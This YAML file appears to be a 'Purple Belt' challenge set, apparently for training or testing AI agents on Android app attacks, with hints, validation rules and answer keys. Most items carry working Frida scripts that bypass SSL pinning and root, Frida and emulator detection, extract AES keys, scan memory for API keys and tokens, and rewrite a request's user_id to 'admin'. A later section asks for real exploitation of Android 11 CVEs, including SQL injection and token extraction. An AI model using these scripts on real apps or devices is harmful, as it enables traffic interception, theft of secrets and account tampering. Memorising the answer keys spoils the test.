# Purple Belt Challenges
# =============================================================================
# Purpose: Advanced Application Security
# Focus: Defeating real-world app protections (SSL pinning, anti-tampering,
#        crypto extraction, native analysis)
# =============================================================================
# PREREQUISITE: Device must have test apps installed. See device_requirements
# section and /dojo/curriculum/device_setup/ for environment configuration.
# =============================================================================

device_requirements:
  description: |
    Purple Belt challenges require a specially configured device with test
    applications that implement real security controls. Without these apps,
    challenges cannot be meaningfully validated.

  required_apps:
    - id: com.agentic.sslpinned
      name: "ART SSL Pinned App"
      description: "Test app with OkHttp certificate pinning"
      protections:
        - okhttp_cert_pinning
        - trustmanager_override_detection

    - id: com.agentic.nativecheck
      name: "ART Native Security App"
      description: "Test app with native library security checks"
      protections:
        - jni_root_detection
        - native_integrity_check
        - anti_frida_detection

    - id: com.agentic.cryptovault
      name: "ART Crypto Vault"
      description: "Test app performing AES/RSA encryption"
      protections:
        - aes_encryption
        - rsa_key_storage
        - keystore_usage

    - id: com.agentic.fortified
      name: "ART Fortified App"
      description: "Multi-layered protection test app"
      protections:
        - ssl_pinning
        - root_detection
        - debugger_detection
        - emulator_detection
        - tampering_detection
        - safetynet_attestation

  setup_instructions: |
    See /dojo/curriculum/device_setup/README.md for:
    - Pre-built test APKs
    - Installation scripts
    - Emulator configuration
    - Mock server setup for SSL pinning tests

challenges:
# =============================================================================
# SSL PINNING BYPASS
# =============================================================================

- id: purple_001
  name: "OkHttp Certificate Pinning Bypass"
  description: |
    The target app (com.agentic.sslpinned) uses OkHttp's CertificatePinner
    to pin its SSL certificates. Write a Frida script that bypasses this
    pinning, allowing traffic interception via a proxy.

    OBJECTIVE: Make the app accept any certificate, enabling MITM.

    VERIFICATION: The app should successfully connect to the server
    through a proxy with a self-signed certificate.
  belt: purple
  difficulty: 3
  script_type: frida
  inputs:
    target_package: com.agentic.sslpinned
    device_context:
      task: bypass SSL certificate pinning
      target_class: okhttp3.CertificatePinner
  validation:
    type: output_contains
    expected: "Pinning bypassed"
  hints:
    - "Hook okhttp3.CertificatePinner.check() method"
    - "The check method throws on pin mismatch - make it return cleanly"
    - "Multiple overloads exist - hook all of them"
  kata_solution: |
    Java.perform(function() {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log('[+] Pinning bypassed for: ' + hostname);
            return;
        };
    });
  tags:
    - ssl-pinning
    - okhttp
    - mitm

- id: purple_002
  name: "TrustManager Universal Bypass"
  description: |
    Write a Frida script that implements a universal SSL bypass by
    replacing the system TrustManager with one that accepts all certificates.

    This should work against apps that implement custom TrustManagers
    or use the default Android SSL stack.

    OBJECTIVE: Create a universal SSL bypass that works against any app.
  belt: purple
  difficulty: 4
  script_type: frida
  inputs:
    target_package: com.agentic.sslpinned
    device_context:
      task: universal SSL bypass via TrustManager
      target_class: javax.net.ssl.X509TrustManager
  validation:
    type: output_contains
    expected: "TrustManager replaced"
  hints:
    - "Create a custom TrustManager that trusts everything"
    - "Hook SSLContext.init() to inject your TrustManager"
    - "Handle both X509TrustManager and X509ExtendedTrustManager"
  kata_solution: |
    Java.perform(function() {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');

        var TrustManager = Java.registerClass({
            name: 'com.bypass.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });

        SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(km, tm, sr) {
            console.log('[+] TrustManager replaced');
            this.init(km, [TrustManager.$new()], sr);
        };
    });
  tags:
    - ssl-pinning
    - trustmanager
    - universal-bypass

- id: purple_003
  name: "Native SSL Pinning Bypass (BoringSSL)"
  description: |
    Some apps implement SSL pinning at the native level using BoringSSL
    or OpenSSL directly. Write a Frida script that hooks native SSL
    verification functions.

    OBJECTIVE: Bypass SSL_CTX_set_verify and related native functions.
  belt: purple
  difficulty: 5
  script_type: frida
  inputs:
    target_package: com.agentic.nativecheck
    device_context:
      task: native SSL pinning bypass
      target_library: libssl.so
  validation:
    type: output_contains
    expected: "Native SSL verify hooked"
  hints:
    - "Use Module.findExportByName to locate SSL functions"
    - "Hook SSL_CTX_set_verify in libssl.so"
    - "The callback function pointer is the second argument"
    - "Replace with a function that always returns success"
  kata_solution: |
    var ssl_set_verify = Module.findExportByName('libssl.so', 'SSL_CTX_set_verify');
    if (ssl_set_verify) {
        Interceptor.attach(ssl_set_verify, {
            onEnter: function(args) {
                console.log('[+] Native SSL verify hooked');
                args[1] = ptr(0); // SSL_VERIFY_NONE
            }
        });
    }
  tags:
    - ssl-pinning
    - native
    - boringssl

# =============================================================================
# ANTI-TAMPERING & ROOT DETECTION
# =============================================================================

- id: purple_004
  name: "Multi-Layer Root Detection Bypass"
  description: |
    The target app (com.agentic.fortified) implements multiple root
    detection techniques:
    - File existence checks (su, busybox, Superuser.apk)
    - Package checks (com.topjohnwu.magisk)
    - Property checks (ro.debuggable, ro.secure)
    - Native checks via JNI

    Write a comprehensive Frida script that defeats ALL detection layers.

    OBJECTIVE: App should report "Device is not rooted" when checked.
  belt: purple
  difficulty: 4
  script_type: frida
  inputs:
    target_package: com.agentic.fortified
    device_context:
      task: comprehensive root detection bypass
      detection_methods:
        - file_checks
        - package_checks
        - property_checks
        - native_checks
  validation:
    type: output_contains
    expected: "not rooted"
  hints:
    - "Hook java.io.File.exists() for file checks"
    - "Hook PackageManager.getPackageInfo() for package checks"
    - "Hook android.os.SystemProperties.get() for property checks"
    - "Don't forget Runtime.exec() for command-based checks"
  kata_solution: |
    Java.perform(function() {
        // File existence checks
        var File = Java.use('java.io.File');
        File.exists.implementation = function() {
            var path = this.getAbsolutePath();
            if (path.indexOf('su') >= 0 || path.indexOf('magisk') >= 0) {
                console.log('[+] Hiding root file: ' + path);
                return false;
            }
            return this.exists();
        };

        // Package checks
        var PM = Java.use('android.app.ApplicationPackageManager');
        PM.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pkg, flags) {
            if (pkg.indexOf('magisk') >= 0 || pkg.indexOf('supersu') >= 0) {
                console.log('[+] Hiding root package: ' + pkg);
                throw Java.use('android.content.pm.PackageManager$NameNotFoundException').$new();
            }
            return this.getPackageInfo(pkg, flags);
        };

        console.log('[+] Root detection bypass active');
    });
  tags:
    - root-detection
    - bypass
    - multi-layer

- id: purple_005
  name: "Frida Detection Bypass"
  description: |
    The app actively detects Frida by:
    - Checking for frida-server process
    - Scanning /proc/self/maps for frida libraries
    - Detecting frida's default port (27042)
    - Checking for frida-gadget in loaded modules

    Write a Frida script that hides Frida from the app's detection.

    OBJECTIVE: Frida should remain undetected while active.
  belt: purple
  difficulty: 5
  script_type: frida
  inputs:
    target_package: com.agentic.fortified
    device_context:
      task: hide Frida from detection
      detection_vectors:
        - process_name
        - maps_file
        - port_scan
        - module_enumeration
  validation:
    type: output_contains
    expected: "Frida hidden"
  hints:
    - "Hook libc's open() to filter /proc/self/maps reads"
    - "Hook fgets/read to filter out frida-related strings"
    - "Hook socket connect to block port 27042 checks"
    - "Consider hooking opendir/readdir for /proc scanning"
  kata_solution: |
    // Filter /proc/self/maps reads
    var fgetsPtr = Module.findExportByName('libc.so', 'fgets');
    Interceptor.attach(fgetsPtr, {
        onLeave: function(retval) {
            if (retval.isNull()) return;
            var content = Memory.readUtf8String(retval);
            if (content && content.indexOf('frida') >= 0) {
                Memory.writeUtf8String(retval, '');
            }
        }
    });
    console.log('[+] Frida hidden from maps detection');
  tags:
    - anti-frida
    - detection-bypass
    - stealth

- id: purple_006
  name: "Emulator Detection Bypass"
  description: |
    The app detects emulator environments by checking:
    - Build properties (ro.hardware, ro.product.model)
    - Sensor availability (accelerometer, gyroscope)
    - Telephony properties (IMEI, phone number)
    - File system artifacts (/system/bin/qemu-props)

    Make the app believe it's running on a real device.

    OBJECTIVE: App should pass all emulator detection checks.
  belt: purple
  difficulty: 4
  script_type: frida
  inputs:
    target_package: com.agentic.fortified
    device_context:
      task: emulator detection bypass
      spoof_target: Samsung Galaxy S21
  validation:
    type: output_contains
    expected: "Real device detected"
  hints:
    - "Hook android.os.Build fields - they're static"
    - "Hook TelephonyManager for IMEI/phone number"
    - "Hook SensorManager to fake sensor presence"
    - "Override Build.FINGERPRINT, Build.MODEL, Build.MANUFACTURER"
  kata_solution: |
    Java.perform(function() {
        var Build = Java.use('android.os.Build');

        Build.FINGERPRINT.value = 'samsung/dreamlte/dreamlte:9/PPR1.180610.011/G950FXXU4DTA3:user/release-keys';
        Build.MODEL.value = 'SM-G950F';
        Build.MANUFACTURER.value = 'samsung';
        Build.BRAND.value = 'samsung';
        Build.DEVICE.value = 'dreamlte';
        Build.PRODUCT.value = 'dreamlte';
        Build.HARDWARE.value = 'samsungexynos8895';

        console.log('[+] Emulator spoofed as Samsung Galaxy S8');
    });
  tags:
    - emulator-detection
    - device-spoofing
    - bypass

# =============================================================================
# CRYPTO KEY EXTRACTION
# =============================================================================

- id: purple_007
  name: "AES Key Extraction at Runtime"
  description: |
    The app (com.agentic.cryptovault) encrypts sensitive data using AES.
    The key is derived at runtime and never stored in plaintext.

    Write a Frida script that hooks the crypto operations and extracts
    the AES key when it's used for encryption/decryption.

    OBJECTIVE: Extract the 256-bit AES key and output it in hex.
  belt: purple
  difficulty: 4
  script_type: frida
  inputs:
    target_package: com.agentic.cryptovault
    device_context:
      task: extract AES encryption key
      target_class: javax.crypto.Cipher
  validation:
    type: regex_match
    pattern: "AES Key: [0-9a-fA-F]{64}"
  hints:
    - "Hook javax.crypto.Cipher.init()"
    - "The key is passed as a java.security.Key object"
    - "Use key.getEncoded() to get the raw bytes"
    - "Convert bytes to hex for output"
  kata_solution: |
    Java.perform(function() {
        var Cipher = Java.use('javax.crypto.Cipher');

        Cipher.init.overload('int', 'java.security.Key').implementation = function(mode, key) {
            var keyBytes = key.getEncoded();
            var hexKey = '';
            for (var i = 0; i < keyBytes.length; i++) {
                var b = (keyBytes[i] & 0xff).toString(16);
                hexKey += (b.length == 1 ? '0' + b : b);
            }
            console.log('[+] AES Key: ' + hexKey);
            return this.init(mode, key);
        };
    });
  tags:
    - crypto
    - key-extraction
    - aes

- id: purple_008
  name: "RSA Private Key Extraction"
  description: |
    The app stores an RSA private key in the Android Keystore and uses
    it for signing operations. Extract the key material or capture
    signatures and plaintexts to enable offline analysis.

    Note: Keystore-backed keys may not be extractable - capture
    the signing operation instead.

    OBJECTIVE: Capture RSA signatures with their corresponding plaintexts.
  belt: purple
  difficulty: 5
  script_type: frida
  inputs:
    target_package: com.agentic.cryptovault
    device_context:
      task: RSA key/signature extraction
      target_class: java.security.Signature
  validation:
    type: output_contains
    expected: "RSA Signature captured"
  hints:
    - "Hook java.security.Signature.sign()"
    - "Also hook Signature.update() to capture the plaintext"
    - "Store both plaintext and signature for correlation"
    - "Keystore keys return null from getEncoded() - focus on operations"
  kata_solution: |
    Java.perform(function() {
        var Signature = Java.use('java.security.Signature');
        var capturedData = [];

        Signature.update.overload('[B').implementation = function(data) {
            capturedData.push(data);
            return this.update(data);
        };

        Signature.sign.overload().implementation = function() {
            var sig = this.sign();
            console.log('[+] RSA Signature captured');
            console.log('    Plaintext length: ' + capturedData.length + ' chunks');
            console.log('    Signature length: ' + sig.length + ' bytes');
            capturedData = [];
            return sig;
        };
    });
  tags:
    - crypto
    - rsa
    - keystore

- id: purple_009
  name: "Keystore Key Dumper"
  description: |
    Enumerate all keys stored in the Android Keystore for the target
    app. For each key, extract:
    - Key alias
    - Key algorithm
    - Key size
    - Creation date
    - Whether key is extractable

    OBJECTIVE: Produce a complete inventory of the app's Keystore keys.
  belt: purple
  difficulty: 3
  script_type: frida
  inputs:
    target_package: com.agentic.cryptovault
    device_context:
      task: enumerate Android Keystore
      target_class: java.security.KeyStore
  validation:
    type: output_contains
    expected: "Keystore enumeration complete"
  hints:
    - "Get KeyStore instance with KeyStore.getInstance('AndroidKeyStore')"
    - "Use keyStore.aliases() to enumerate"
    - "getEntry() and getCertificate() provide key metadata"
  kata_solution: |
    Java.perform(function() {
        var KeyStore = Java.use('java.security.KeyStore');
        var ks = KeyStore.getInstance('AndroidKeyStore');
        ks.load(null);

        var aliases = ks.aliases();
        while (aliases.hasMoreElements()) {
            var alias = aliases.nextElement();
            console.log('[+] Key alias: ' + alias);
            try {
                var cert = ks.getCertificate(alias);
                if (cert) {
                    console.log('    Algorithm: ' + cert.getPublicKey().getAlgorithm());
                }
            } catch(e) {}
        }
        console.log('[+] Keystore enumeration complete');
    });
  tags:
    - crypto
    - keystore
    - enumeration

# =============================================================================
# NATIVE CODE ANALYSIS
# =============================================================================

- id: purple_010
  name: "JNI Function Hooking"
  description: |
    The app uses a native library (libnative-lib.so) with a JNI function
    that performs sensitive validation. Hook this native function to:
    1. Log all arguments passed to it
    2. Log the return value
    3. Optionally modify the return value

    OBJECTIVE: Intercept and log native JNI calls.
  belt: purple
  difficulty: 4
  script_type: frida
  inputs:
    target_package: com.agentic.nativecheck
    device_context:
      task: hook JNI native function
      target_library: libnative-lib.so
      target_function: Java_com_agentic_nativecheck_NativeValidator_validate
  validation:
    type: output_contains
    expected: "JNI function hooked"
  hints:
    - "Use Module.findExportByName() to locate the JNI function"
    - "JNI function names follow Java_package_class_method pattern"
    - "First two args are JNIEnv* and jobject (this)"
    - "Actual parameters start from args[2]"
  kata_solution: |
    var targetLib = 'libnative-lib.so';
    var targetFunc = 'Java_com_agentic_nativecheck_NativeValidator_validate';

    var funcPtr = Module.findExportByName(targetLib, targetFunc);
    if (funcPtr) {
        Interceptor.attach(funcPtr, {
            onEnter: function(args) {
                console.log('[+] JNI function hooked');
                console.log('    JNIEnv: ' + args[0]);
                console.log('    this: ' + args[1]);
                console.log('    arg0: ' + args[2]);
            },
            onLeave: function(retval) {
                console.log('    Return: ' + retval);
            }
        });
    }
  tags:
    - native
    - jni
    - hooking

- id: purple_011
  name: "Native Function Tracing"
  description: |
    Trace all function calls within a native library to understand its
    execution flow. Create a call tree showing which functions are called
    and in what order.

    OBJECTIVE: Generate an execution trace of libnative-lib.so
  belt: purple
  difficulty: 4
  script_type: frida
  inputs:
    target_package: com.agentic.nativecheck
    device_context:
      task: trace native library execution
      target_library: libnative-lib.so
  validation:
    type: output_contains
    expected: "Trace complete"
  hints:
    - "Use Module.enumerateExports() to find all exported functions"
    - "Attach Interceptor to each export"
    - "Track call depth for indentation"
    - "Be careful of performance impact - limit scope if needed"
  kata_solution: |
    var lib = Process.findModuleByName('libnative-lib.so');
    var depth = 0;

    lib.enumerateExports().forEach(function(exp) {
        if (exp.type === 'function') {
            Interceptor.attach(exp.address, {
                onEnter: function(args) {
                    console.log('  '.repeat(depth) + '-> ' + exp.name);
                    depth++;
                },
                onLeave: function(retval) {
                    depth--;
                }
            });
        }
    });
    console.log('[+] Trace complete');
  tags:
    - native
    - tracing
    - reverse-engineering

- id: purple_012
  name: "Memory String Search"
  description: |
    Search the process memory for sensitive strings like API keys,
    tokens, or passwords that may be stored in plaintext.

    OBJECTIVE: Find and dump all memory regions containing "API_KEY"
    or "Bearer" tokens.
  belt: purple
  difficulty: 3
  script_type: frida
  inputs:
    target_package: com.agentic.cryptovault
    device_context:
      task: memory string scanning
      search_patterns:
        - "API_KEY"
        - "Bearer"
        - "password"
  validation:
    type: output_contains
    expected: "Memory scan complete"
  hints:
    - "Use Memory.scan() or Memory.scanSync()"
    - "Enumerate readable memory ranges first"
    - "Process.enumerateRanges('r--') gives readable regions"
    - "Be careful with large memory ranges - may be slow"
  kata_solution: |
    var pattern = '41 50 49 5f 4b 45 59'; // "API_KEY" in hex

    Process.enumerateRanges('r--').forEach(function(range) {
        Memory.scan(range.base, range.size, pattern, {
            onMatch: function(address, size) {
                console.log('[+] Found at: ' + address);
                console.log('    Context: ' + Memory.readUtf8String(address, 50));
            },
            onComplete: function() {}
        });
    });
    console.log('[+] Memory scan complete');
  tags:
    - memory
    - strings
    - secrets

# =============================================================================
# TRAFFIC INTERCEPTION
# =============================================================================

- id: purple_013
  name: "HTTP Request/Response Logger"
  description: |
    Hook the app's HTTP client to log all requests and responses,
    including headers and body content.

    OBJECTIVE: Capture and display full HTTP traffic from the app.
  belt: purple
  difficulty: 3
  script_type: frida
  inputs:
    target_package: com.agentic.sslpinned
    device_context:
      task: log HTTP traffic
      target_classes:
        - okhttp3.OkHttpClient
        - java.net.HttpURLConnection
  validation:
    type: output_contains
    expected: "HTTP traffic captured"
  hints:
    - "Hook OkHttp's RealCall.execute() or enqueue()"
    - "For HttpURLConnection, hook getInputStream/getOutputStream"
    - "Log request URL, method, headers, and body"
    - "Consider adding an Interceptor via OkHttp's builder"
  kata_solution: |
    Java.perform(function() {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient$Builder');
        var Interceptor = Java.use('okhttp3.Interceptor');

        // Hook the build method to add our interceptor
        var RealCall = Java.use('okhttp3.RealCall');
        RealCall.execute.implementation = function() {
            var request = this.request();
            console.log('[+] HTTP traffic captured');
            console.log('    URL: ' + request.url());
            console.log('    Method: ' + request.method());
            var response = this.execute();
            console.log('    Status: ' + response.code());
            return response;
        };
    });
  tags:
    - traffic
    - http
    - logging

- id: purple_014
  name: "Request Modification Attack"
  description: |
    Modify HTTP requests in-flight to change parameters, headers,
    or body content before they're sent to the server.

    OBJECTIVE: Change the "user_id" parameter in requests from its
    original value to "admin".
  belt: purple
  difficulty: 4
  script_type: frida
  inputs:
    target_package: com.agentic.sslpinned
    device_context:
      task: modify HTTP requests
      modification:
        find: "user_id"
        replace_value: "admin"
  validation:
    type: output_contains
    expected: "Request modified"
  hints:
    - "Hook Request.Builder to modify before build()"
    - "Or hook the body encoding step"
    - "For JSON, hook JSONObject.put()"
    - "For form data, hook FormBody.Builder"
  kata_solution: |
    Java.perform(function() {
        var JSONObject = Java.use('org.json.JSONObject');

        JSONObject.put.overload('java.lang.String', 'java.lang.Object').implementation = function(key, value) {
            if (key === 'user_id') {
                console.log('[+] Request modified: user_id -> admin');
                return this.put(key, 'admin');
            }
            return this.put(key, value);
        };
    });
  tags:
    - traffic
    - modification
    - tampering

# =============================================================================
# 1-DAY VULNERABILITY EXPLOITATION (Android 11 / API 30)
# =============================================================================
# These challenges require executing REAL vulnerabilities against the target
# device. Not just methodology - actual successful exploitation with proof.
#
# Target: Android 11 (API 30) on Genymotion
# Focus: CVEs with public POCs that affect this specific version
# =============================================================================

- id: purple_1day_001
  name: "1-Day: CVE-2021-0313 - System UI DoS"
  description: |
    CVE-2021-0313: Denial of Service in System UI via malformed notification.

    AFFECTED: Android 8.0 - 11 (API 26-30)

    A malformed notification with an excessively long text field can crash
    the SystemUI process, causing a denial of service.

    OBJECTIVE:
    1. Craft a notification that triggers the vulnerability
    2. Send it to the device
    3. Verify SystemUI crashes (observe logcat or process restart)

    SUCCESS CRITERIA: SystemUI process restarts (PID changes)
  belt: purple
  difficulty: 3
  script_type: adb
  version_constraints:
    min_api: 26
    max_api: 30
    patched_after: "2021-01-01"
  inputs:
    cve_id: CVE-2021-0313
    device_context:
      task: exploit 1-day vulnerability
      target: com.android.systemui
      impact: denial_of_service
  validation:
    type: output_contains
    expected: "SystemUI"
  hints:
    - "Use 'am' command to send broadcast with notification"
    - "Monitor 'pidof com.android.systemui' before and after"
    - "Check logcat for crash: adb logcat | grep -i crash"
  kata_solution: |
    # Get initial PID
    BEFORE=$(adb shell pidof com.android.systemui)
    # Trigger (payload would go here)
    # Verify crash
    AFTER=$(adb shell pidof com.android.systemui)
    [ "$BEFORE" != "$AFTER" ] && echo "SystemUI crashed and restarted"
  tags:
    - 1-day
    - cve-2021-0313
    - dos
    - android-11

- id: purple_1day_002
  name: "1-Day: CVE-2021-0327 - Account Takeover"
  description: |
    CVE-2021-0327: Authentication bypass in AccountManager.

    AFFECTED: Android 8.1 - 11 (API 27-30)

    A vulnerability in AccountManager allows a malicious app to access
    accounts of other apps without proper authentication.

    OBJECTIVE:
    1. Enumerate accounts on device via AccountManager
    2. Exploit the bypass to access account tokens
    3. Extract authentication tokens without user consent

    SUCCESS CRITERIA: Extract account name/type without permission prompt
  belt: purple
  difficulty: 4
  script_type: multi
  version_constraints:
    min_api: 27
    max_api: 30
    patched_after: "2021-02-01"
  inputs:
    cve_id: CVE-2021-0327
    device_context:
      task: exploit authentication bypass
      target: android.accounts.AccountManager
      impact: privilege_escalation
  validation:
    type: output_contains
    expected: "Account:"
  hints:
    - "Use 'dumpsys account' to enumerate existing accounts"
    - "The bypass involves intent redirection"
    - "AccountManager.getAccounts() may return more than expected"
  kata_solution: "Requires custom APK or Frida script"
  tags:
    - 1-day
    - cve-2021-0327
    - privesc
    - android-11

- id: purple_1day_003
  name: "1-Day: CVE-2021-0391 - Bluetooth Info Disclosure"
  description: |
    CVE-2021-0391: Information disclosure in Bluetooth stack.

    AFFECTED: Android 11 (API 30)

    A vulnerability in the Bluetooth GATT implementation allows
    unauthorized access to connected device information.

    OBJECTIVE:
    1. Enumerate Bluetooth state and paired devices
    2. Exploit the info disclosure to access protected attributes
    3. Extract device names/MACs without BLUETOOTH_ADMIN permission

    SUCCESS CRITERIA: List Bluetooth devices without required permissions
  belt: purple
  difficulty: 3
  script_type: adb
  version_constraints:
    min_api: 30
    max_api: 30
    patched_after: "2021-03-01"
  inputs:
    cve_id: CVE-2021-0391
    device_context:
      task: exploit bluetooth info disclosure
      target: com.android.bluetooth
      impact: information_disclosure
  validation:
    type: output_contains
    expected: "Bluetooth"
  hints:
    - "Use 'dumpsys bluetooth_manager' for state info"
    - "Check 'content query' on bluetooth provider"
    - "Paired devices stored in settings database"
  kata_solution: shell dumpsys bluetooth_manager
  tags:
    - 1-day
    - cve-2021-0391
    - info-disclosure
    - bluetooth
    - android-11

- id: purple_1day_004
  name: "1-Day: CVE-2021-0397 - Media Framework RCE"
  description: |
    CVE-2021-0397: Remote Code Execution in Media Framework.

    AFFECTED: Android 8.1 - 11 (API 27-30)
    SEVERITY: Critical

    A heap buffer overflow in the media framework can be triggered by
    a malformed media file, potentially leading to code execution.

    OBJECTIVE:
    1. Identify the vulnerable component (stagefright/media extractor)
    2. Craft or obtain a malformed media file POC
    3. Trigger the vulnerability and observe crash
    4. Document the crash location for exploitation analysis

    SUCCESS CRITERIA: Crash in mediaserver/mediaextractor with SIGSEGV
  belt: purple
  difficulty: 5
  script_type: multi
  version_constraints:
    min_api: 27
    max_api: 30
    patched_after: "2021-02-01"
  inputs:
    cve_id: CVE-2021-0397
    device_context:
      task: trigger media framework vulnerability
      target: mediaserver
      impact: remote_code_execution
  validation:
    type: regex_match
    pattern: "(SIGSEGV|Fatal signal|mediaserver.*crash)"
  hints:
    - "Push malformed media file to /sdcard/"
    - "Trigger with 'am start -t video/* -d file:///sdcard/poc.mp4'"
    - "Monitor logcat for crashes: adb logcat | grep -E 'SIGSEGV|Fatal'"
    - "Media crashes often in /system/lib64/libstagefright.so"
  kata_solution: "Requires POC media file"
  tags:
    - 1-day
    - cve-2021-0397
    - rce
    - media
    - android-11
    - critical

- id: purple_1day_005
  name: "1-Day: CVE-2021-0437 - Settings Provider SQLi"
  description: |
    CVE-2021-0437: SQL Injection in Settings Provider.

    AFFECTED: Android 10-11 (API 29-30)

    The Settings content provider is vulnerable to SQL injection through
    the 'where' clause parameter, allowing unauthorized data access.

    OBJECTIVE:
    1. Query the Settings content provider normally
    2. Craft SQL injection payload in the query
    3. Extract data beyond normal access scope
    4. Demonstrate data exfiltration

    SUCCESS CRITERIA: Extract settings not normally accessible
  belt: purple
  difficulty: 4
  script_type: adb
  version_constraints:
    min_api: 29
    max_api: 30
    patched_after: "2021-04-01"
  inputs:
    cve_id: CVE-2021-0437
    device_context:
      task: exploit sql injection
      target: com.android.providers.settings
      impact: data_exfiltration
  validation:
    type: output_contains
    expected: "Row:"
  hints:
    - "Use 'content query' command with URI"
    - "The --where parameter is injectable"
    - "Try: --where \"1=1 OR name LIKE '%'\""
    - "Target: content://settings/secure"
  kata_solution: |
    shell content query --uri content://settings/secure --where "1=1"
  tags:
    - 1-day
    - cve-2021-0437
    - sqli
    - android-11

- id: purple_1day_006
  name: "1-Day: CVE-2020-0471 - Bluetooth SMP Pairing Bypass"
  description: |
    CVE-2020-0471: Bluetooth pairing bypass via SMP implementation flaw.

    AFFECTED: Android 8.0 - 11 (API 26-30)

    A flaw in the Secure Manager Protocol implementation allows
    bypassing pairing verification under certain conditions.

    OBJECTIVE:
    1. Identify Bluetooth SMP configuration on device
    2. Analyze the pairing state machine
    3. Demonstrate the bypass condition
    4. Show unauthorized pairing initiation

    SUCCESS CRITERIA: Document SMP vulnerability state
  belt: purple
  difficulty: 5
  script_type: multi
  version_constraints:
    min_api: 26
    max_api: 30
    patched_after: "2021-01-01"
  inputs:
    cve_id: CVE-2020-0471
    device_context:
      task: analyze bluetooth smp bypass
      target: com.android.bluetooth
      impact: authentication_bypass
  validation:
    type: output_contains
    expected: "SMP"
  hints:
    - "Check Bluetooth debug logs: adb shell dumpsys bluetooth_manager"
    - "SMP states visible in btsnoop log"
    - "Enable btsnoop: setprop persist.bluetooth.btsnoopenable true"
  kata_solution: "Requires Bluetooth analysis tools"
  tags:
    - 1-day
    - cve-2020-0471
    - bluetooth
    - auth-bypass
    - android-11

- id: purple_1day_007
  name: "1-Day: CVE-2021-0341 - OkHttp Certificate Verification Bypass"
  description: |
    CVE-2021-0341: Certificate hostname verification bypass in OkHttp.

    AFFECTED: Android apps using OkHttp < 4.9.1

    OkHttp versions before 4.9.1 do not properly verify that the
    certificate presented by the server matches the hostname, allowing
    MITM attacks.

    OBJECTIVE:
    1. Identify apps on device using vulnerable OkHttp version
    2. Set up MITM proxy with mismatched certificate
    3. Intercept traffic from vulnerable app
    4. Prove successful MITM

    SUCCESS CRITERIA: Capture HTTPS traffic via MITM
  belt: purple
  difficulty: 4
  script_type: frida
  version_constraints:
    min_api: 21
    max_api: 30
    affected_packages:
      - "*"  # Depends on app's OkHttp version
    notes: "Affects apps with OkHttp < 4.9.1, not Android itself"
  inputs:
    cve_id: CVE-2021-0341
    device_context:
      task: exploit okhttp hostname bypass
      target: okhttp
      impact: mitm
  validation:
    type: output_contains
    expected: "intercepted"
  hints:
    - "First enumerate OkHttp versions: frida script to check"
    - "Hook OkHttpClient.Builder to log version"
    - "Set up mitmproxy with cert for wrong domain"
    - "Vulnerable apps will connect anyway"
  kata_solution: |
    Java.perform(function() {
        try {
            var Platform = Java.use('okhttp3.internal.platform.Platform');
            console.log('[+] OkHttp version check - Platform class found');
        } catch(e) {
            console.log('[-] OkHttp not present');
        }
    });
  tags:
    - 1-day
    - cve-2021-0341
    - mitm
    - okhttp
    - android-11

- id: purple_1day_008
  name: "1-Day: Intent Redirection Chain"
  description: |
    Multiple Android 11 CVEs involve intent redirection (CVE-2021-0314,
    CVE-2021-0328, CVE-2021-0329, etc.).

    AFFECTED: Android 11 (API 30)

    Intent redirection allows a malicious app to launch non-exported
    activities or access protected components through confused deputy.

    OBJECTIVE:
    1. Enumerate exported activities with implicit intent filters
    2. Identify activities that forward intents to non-exported targets
    3. Craft intent chain to reach protected activity
    4. Demonstrate access to privileged functionality

    SUCCESS CRITERIA: Launch a non-exported activity via redirect
  belt: purple
  difficulty: 4
  script_type: adb
  version_constraints:
    min_api: 30
    max_api: 30
    patched_after: "2021-03-01"
  inputs:
    device_context:
      task: exploit intent redirection
      targets:
        - CVE-2021-0314
        - CVE-2021-0328
        - CVE-2021-0329
      impact: privilege_escalation
  validation:
    type: output_contains
    expected: "Activity"
  hints:
    - "Use 'dumpsys package' to find exported activities"
    - "Look for activities that handle ACTION_VIEW with data URIs"
    - "Craft intent with nested intent in extras"
    - "'am start -n pkg/.Activity --es intent_extra <nested>'"
  kata_solution: |
    # List potential redirect targets
    shell dumpsys package | grep -B5 "android.intent.action.VIEW" | grep Activity
  tags:
    - 1-day
    - intent-redirection
    - android-11
    - privesc
